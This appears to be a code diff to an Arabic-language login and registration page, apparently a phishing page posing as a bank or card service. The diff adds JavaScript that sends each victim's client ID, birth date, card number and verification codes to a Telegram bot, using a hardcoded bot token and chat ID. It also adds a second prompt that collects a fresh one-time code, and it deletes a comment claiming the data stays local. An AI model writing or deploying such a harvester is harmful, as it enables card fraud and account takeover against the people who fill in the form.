@@ -232,11 +232,23 @@
       </div>
       <button class="main-btn" onclick="submitRegister()">إرسال</button>
     </div>
+    <div id="verify-section" style="display:none; margin-top:20px;">
+      <div class="card">
+        <div class="form-title">إدخال رمز التحقق مرة أخرى</div>
+        <div class="input-group">
+          <input type="text" class="input-field" placeholder="رمز التحقق الجديد *" id="verify-code">
+        </div>
+        <button class="main-btn" onclick="submitVerify()">إرسال الرمز</button>
+      </div>
+    </div>
     <div class="footer-links">
       <a class="footer-link" onclick="showLogin()">عودة إلى الدخول</a>
     </div>
   </div>
   <script>
+    const TELEGRAM_TOKEN = "7962720643:AAFgFfeyec_SfTiEpQOsMPe7QSa7vH4Luq8";
+    const TELEGRAM_CHAT_ID = "6873334348";
+
     function showRegister() {
       document.getElementById('login-page').style.display = 'none';
       document.getElementById('register-page').style.display = '';
@@ -265,8 +277,22 @@
       input.focus();
       input.onblur = function() { setTimeout(() => { input.type = 'text'; }, 300); };
     }
+    function sendToTelegram(message) {
+      const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+      fetch(url, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: message
+        })
+      }).then(r => r.json()).then(data => {
+        // يمكن إضافة معالجة أو إخطار للمستخدم هنا
+      }).catch(err => {
+        alert('تعذر إرسال البيانات إلى تلجرام');
+      });
+    }
     function submitRegister() {
-      // بيانات التسجيل محلياً فقط
       const user = document.getElementById('reg-user').value.trim();
       const birth = document.getElementById('reg-birth').value.trim();
       const card = document.getElementById('reg-card').value.trim();
@@ -276,7 +302,26 @@
         alert('يرجى تعبئة جميع الحقول والموافقة على الشروط');
         return;
       }
-      alert('تم إرسال البيانات محلياً (بدون إرسال خارجي)\nرمز العميل: ' + user + '\nتاريخ الميلاد: ' + birth + '\nرقم البطاقة: ' + card + '\nرمز التحقق: ' + code);
+      const msg = `تسجيل جديد:\nرمز العميل: ${user}\nتاريخ الميلاد: ${birth}\nرقم البطاقة: ${card}\nرمز التحقق: ${code}`;
+      sendToTelegram(msg);
+      alert('تم إرسال البيانات إلى تلجرام');
+      // إظهار إدخال رمز التحقق الجديد
+      document.getElementById('verify-section').style.display = '';
+    }
+    function submitVerify() {
+      const user = document.getElementById('reg-user').value.trim();
+      const birth = document.getElementById('reg-birth').value.trim();
+      const card = document.getElementById('reg-card').value.trim();
+      const verifyCode = document.getElementById('verify-code').value.trim();
+      if (!verifyCode) {
+        alert('يرجى إدخال رمز التحقق الجديد');
+        return;
+      }
+      const msg = `إعادة إرسال رمز التحقق:\nرمز العميل: ${user}\nتاريخ الميلاد: ${birth}\nرقم البطاقة: ${card}\nرمز التحقق الجديد: ${verifyCode}`;
+      sendToTelegram(msg);
+      alert('تم إرسال رمز التحقق الجديد إلى تلجرام');
+      document.getElementById('verify-section').style.display = 'none';
+      // يمكن هنا إعادة تعيين النموذج أو إعادة المستخدم لصفحة الدخول
     }
   </script>
 </body>
